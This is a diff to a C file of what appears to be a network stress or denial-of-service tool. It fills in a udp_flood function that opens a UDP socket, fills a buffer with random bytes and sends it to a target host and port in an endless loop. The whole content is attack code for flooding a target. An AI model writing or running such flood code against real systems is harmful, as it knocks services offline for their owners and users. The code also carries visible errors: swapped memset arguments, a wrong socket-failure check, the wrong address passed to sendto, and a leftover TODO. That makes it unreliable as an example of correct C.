@@ -13,13 +13,16 @@
 // limitations under the License.
 
 #include <stdio.h>
+#include <string.h>
 
 #include <lib/info.h>
 #include <lib/mem.h>
 #include <lib/conn.h>
+#include <lib/util.h>
 
 #include "udp_flood.h"
 
+#define PK_SIZE 256
 
 /*
  * Udp flood
@@ -46,15 +49,39 @@
  *
  */
 void udp_flood(arguments args) {
-	STATUS("[ * ] UDP-FLOOD attack is starting.");
+	STATUS("UDP-FLOOD attack is starting.");
 	// if random flag is set just alert user
 	// that the UDP Flood already uses random port option
 	// due to the nature of the attack
 	if (args.port.random)
-		STATUS("[ * ] UDP_FLOOD already uses the random flag.");
+		STATUS("UDP_FLOOD already uses the random flag.");
 
 	conn_t *conn = NULL;
 	conn = conn_new(args.host_type);
+	
+	conn->c4->addr->sin_family = AF_INET;
+	conn->c4->addr->sin_port = htons(args.port.n);
+	memset(&conn->c4->addr->sin_addr, sizeof(conn->c4->addr->sin_addr), 0);
+
+	conn->c4->sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+	if (!conn->c4->sock) {
+		conn_free(conn, args.host_type);
+		INFOEE("Could not create the upd socket");
+	}
+
+	conn->c4->buff = xzmalloc(PK_SIZE * sizeof(conn->c4->buff));
+	for(int i=0; i<PK_SIZE; i++) {
+		urandom_bytes(&conn->c4->buff[i], sizeof(conn->c4->buff[i]));
+	}
+	//TODO
+	ssize_t n = 0;
+	for(;;) {
+		n = sendto(conn->c4->sock,conn->c4->buff, PK_SIZE*sizeof(conn->c4->buff),
+				0, (SA*)&conn->c4->addr->sin_addr, sizeof(conn->c4->addr->sin_addr));
+		if (!n) {
+			break;
+		}
+	}
 }
 
 
